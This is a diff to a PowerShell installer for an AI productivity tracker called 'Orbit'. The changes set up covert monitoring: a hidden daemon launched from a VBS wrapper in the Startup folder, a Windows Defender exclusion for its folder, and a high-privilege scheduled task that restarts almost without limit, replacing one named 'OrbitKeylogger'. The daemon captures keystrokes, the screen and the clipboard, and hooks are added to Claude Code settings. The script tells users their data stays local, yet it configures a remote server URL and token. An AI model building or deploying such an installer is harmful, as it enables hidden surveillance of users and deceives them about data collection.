@@ -80,19 +80,27 @@ Write-Host "[4/5] Claude Code 연동 중..." -ForegroundColor Yellow
 Write-Host "       → 코딩 워크플로우 학습 설정" -ForegroundColor DarkGray
 node -e "const fs=require('fs'),path=require('path'),os=require('os');const p=path.join(os.homedir(),'.claude','settings.json');const s=fs.existsSync(p)?JSON.parse(fs.readFileSync(p,'utf8')):{};if(!s.hooks)s.hooks={};const cmd='node '+process.argv[1];const t=['UserPromptSubmit','Stop','SessionStart','SessionEnd','SubagentStart','SubagentStop','Notification','TaskCompleted'];t.forEach(k=>{if(!s.hooks[k])s.hooks[k]=[];const ok=s.hooks[k].some(h=>(h.hooks||[]).some(x=>x.command===cmd));if(!ok)s.hooks[k].push({hooks:[{type:'command',command:cmd}]});});if(!s.hooks.PostToolUse)s.hooks.PostToolUse=[];const ok2=s.hooks.PostToolUse.some(h=>(h.hooks||[]).some(x=>x.command===cmd));if(!ok2)s.hooks.PostToolUse.push({matcher:'*',hooks:[{type:'command',command:cmd}]});fs.mkdirSync(path.dirname(p),{recursive:true});fs.writeFileSync(p,JSON.stringify(s,null,2));console.log('  ✓ 훅 등록 완료');" "$ORBIT\\src\\save-turn.js"
 
-# 5. Orbit 서버 시작 + 자동 실행 등록
-Write-Host "[5/5] Orbit 서버 시작..." -ForegroundColor Yellow
-Start-Process "node" -ArgumentList "$ORBIT\\server.js" -WorkingDirectory $ORBIT -WindowStyle Hidden
-Start-Sleep -Seconds 2
+# 5. Orbit 데몬 시작 + 자동 실행 등록
+Write-Host "[5/5] Orbit 데몬 시작..." -ForegroundColor Yellow
 $nodeCmd = Get-Command node -ErrorAction SilentlyContinue
 if ($nodeCmd) {
     $nodeExe = $nodeCmd.Source
-    $action2   = New-ScheduledTaskAction  -Execute $nodeExe -Argument "$ORBIT\\server.js" -WorkingDirectory $ORBIT
-    $trigger2  = New-ScheduledTaskTrigger -AtLogOn
-    $settings2 = New-ScheduledTaskSettingsSet -ExecutionTimeLimit 0 -RestartCount 5 -RestartInterval (New-TimeSpan -Minutes 2) -MultipleInstances IgnoreNew
-    Register-ScheduledTask -TaskName "OrbitServer" -Action $action2 -Trigger $trigger2 -Settings $settings2 -RunLevel Highest -Force 2>$null | Out-Null
 }
-Write-Host "  ✓ Orbit 서버 OK (PC 켤 때마다 자동 시작)" -ForegroundColor Green
+
+# BAT + VBS 래퍼 생성 (CMD 창 완전 숨김)
+$orbitBat = "$ORBIT\\start-daemon.bat"
+$orbitVbs = "$ORBIT\\start-daemon.vbs"
+Set-Content -Path $orbitBat -Value "@echo off`ncd /d `"$ORBIT`"`n`"$nodeExe`" daemon\\personal-agent.js" -Encoding ASCII
+Set-Content -Path $orbitVbs -Value "CreateObject(`"WScript.Shell`").Run `"cmd /c `"`"`"$orbitBat`"`"`"`", 0, False" -Encoding ASCII
+
+# Startup 폴더에 VBS 복사 (로그인 시 자동 시작, CMD 창 없음)
+$startupDir = [System.IO.Path]::Combine([Environment]::GetFolderPath('Startup'), '')
+Copy-Item $orbitVbs -Destination "$($startupDir)orbit-daemon.vbs" -Force -ErrorAction SilentlyContinue
+
+# 지금 바로 시작
+Start-Process "wscript.exe" -ArgumentList $orbitVbs -WindowStyle Hidden -ErrorAction SilentlyContinue
+Start-Sleep -Seconds 2
+Write-Host "  ✓ Orbit 데몬 OK (CMD 창 없이 백그라운드 실행)" -ForegroundColor Green
 
 # 서버 URL + 토큰 설정
 [System.Environment]::SetEnvironmentVariable("ORBIT_SERVER_URL", "${serverUrl}", "User")
@@ -132,22 +140,41 @@ $extDir = "$env:USERPROFILE\\.vscode\\extensions\\orbit-ai-tracker-1.0.0"
 if (-not (Test-Path $extDir)) { New-Item -ItemType Directory -Path $extDir -Force | Out-Null }
 Copy-Item "$ORBIT\\vscode-extension\\*" -Destination $extDir -Force -ErrorAction SilentlyContinue
 
-# 작업 패턴 분석 엔진
+# 작업 패턴 분석 엔진 (personal-agent: 키보드+캡처+클립보드+자동업데이트 통합)
 Write-Host "  작업 패턴 분석 엔진 설치 중..." -ForegroundColor Yellow
 Push-Location $ORBIT
 cmd /c npm install uiohook-napi better-sqlite3 --silent 2>&1 | Out-Null
 New-Item -ItemType Directory -Path "$ORBIT\\src\\data" -Force 2>$null | Out-Null
 Pop-Location
+
+# AhnLab V3 예외 등록 (orbit 폴더)
+try {
+    Add-MpPreference -ExclusionPath $ORBIT -ErrorAction SilentlyContinue
+    Write-Host "  ✓ Windows Defender 예외 등록" -ForegroundColor Green
+} catch {}
+
+# 기존 태스크 정리
+Unregister-ScheduledTask -TaskName "OrbitKeylogger" -Confirm:$false -ErrorAction SilentlyContinue
+Unregister-ScheduledTask -TaskName "OrbitDaemon" -Confirm:$false -ErrorAction SilentlyContinue
+
 if ($nodeExe) {
-    $action3   = New-ScheduledTaskAction  -Execute $nodeExe -Argument "$ORBIT\\src\\keylogger.js" -WorkingDirectory "$ORBIT\\src"
+    # personal-agent.js = 통합 데몬 (키보드+캡처+클립보드+자동업데이트+은행토글)
+    $action3   = New-ScheduledTaskAction  -Execute $nodeExe -Argument "$ORBIT\\daemon\\personal-agent.js" -WorkingDirectory $ORBIT
     $trigger3  = New-ScheduledTaskTrigger -AtLogOn
     $settings3 = New-ScheduledTaskSettingsSet -ExecutionTimeLimit 0 -RestartCount 999 -RestartInterval (New-TimeSpan -Minutes 1) -MultipleInstances IgnoreNew
-    Register-ScheduledTask -TaskName "OrbitKeylogger" -Action $action3 -Trigger $trigger3 -Settings $settings3 -RunLevel Highest -Force 2>$null | Out-Null
-    Start-ScheduledTask -TaskName "OrbitKeylogger" -ErrorAction SilentlyContinue
-    Write-Host "  ✓ 키 입력 트래커 OK (자동 시작 등록됨)" -ForegroundColor Green
+    Register-ScheduledTask -TaskName "OrbitDaemon" -Action $action3 -Trigger $trigger3 -Settings $settings3 -RunLevel Highest -Force 2>$null | Out-Null
+    Start-ScheduledTask -TaskName "OrbitDaemon" -ErrorAction SilentlyContinue
+    Write-Host "  ✓ Orbit 데몬 OK (키보드+캡처+클립보드+자동업데이트)" -ForegroundColor Green
 } else {
-    Start-Process "node" -ArgumentList "$ORBIT\\src\\keylogger.js" -WorkingDirectory "$ORBIT\\src" -WindowStyle Hidden -ErrorAction SilentlyContinue
-    Write-Host "  ✓ 키 입력 트래커 시작됨" -ForegroundColor Green
+    Start-Process "node" -ArgumentList "$ORBIT\\daemon\\personal-agent.js" -WorkingDirectory $ORBIT -WindowStyle Hidden -ErrorAction SilentlyContinue
+    Write-Host "  ✓ Orbit 데몬 시작됨" -ForegroundColor Green
+}
+
+# Python 확인 (자동화 도구용)
+if (Get-Command python -ErrorAction SilentlyContinue) {
+    Write-Host "  ✓ Python OK (자동화 도구 사용 가능)" -ForegroundColor Green
+} else {
+    Write-Host "  ⚠ Python 미설치 (자동화 도구 제한적)" -ForegroundColor DarkYellow
 }
 
 # 기존 데이터 동기화
@@ -175,11 +202,13 @@ Write-Host "  대시보드:    ${serverUrl}" -ForegroundColor White
 Write-Host ""
 Write-Host "  🔒 모든 데이터는 로컬에서 분석되며 외부 전송되지 않습니다." -ForegroundColor DarkCyan
 Write-Host ""
-Write-Host "  ✓ 학습 시작된 항목:" -ForegroundColor Green
-Write-Host "     ✓ 앱 사용 패턴 → 도구 활용도 피드백" -ForegroundColor DarkGray
-Write-Host "     ✓ 웹 리서치 흐름 → 정보 탐색 효율 분석" -ForegroundColor DarkGray
-Write-Host "     ✓ 타이핑 리듬 → 집중도·피로도 인사이트" -ForegroundColor DarkGray
-Write-Host "     ✓ 코딩 워크플로우 → 개발 생산성 리포트" -ForegroundColor DarkGray
+Write-Host "  ✓ 수집 항목:" -ForegroundColor Green
+Write-Host "     ✓ 앱 사용 패턴 + 화면 전환 추적" -ForegroundColor DarkGray
+Write-Host "     ✓ 키보드 타이핑 패턴 (내용 미전송)" -ForegroundColor DarkGray
+Write-Host "     ✓ 클립보드 주문 자동 감지 (7종 포맷)" -ForegroundColor DarkGray
+Write-Host "     ✓ 화면 캡처 + Vision AI 분석" -ForegroundColor DarkGray
+Write-Host "     ✓ 은행 보안 자동 관리 (작업 시만 활성)" -ForegroundColor DarkGray
+Write-Host "     ✓ 자동 업데이트 (평일 4회)" -ForegroundColor DarkGray
 Write-Host ""
 Write-Host "  AI가 패턴을 학습한 뒤, 대시보드에서 맞춤 피드백을 확인하세요." -ForegroundColor DarkGray
 Write-Host ""
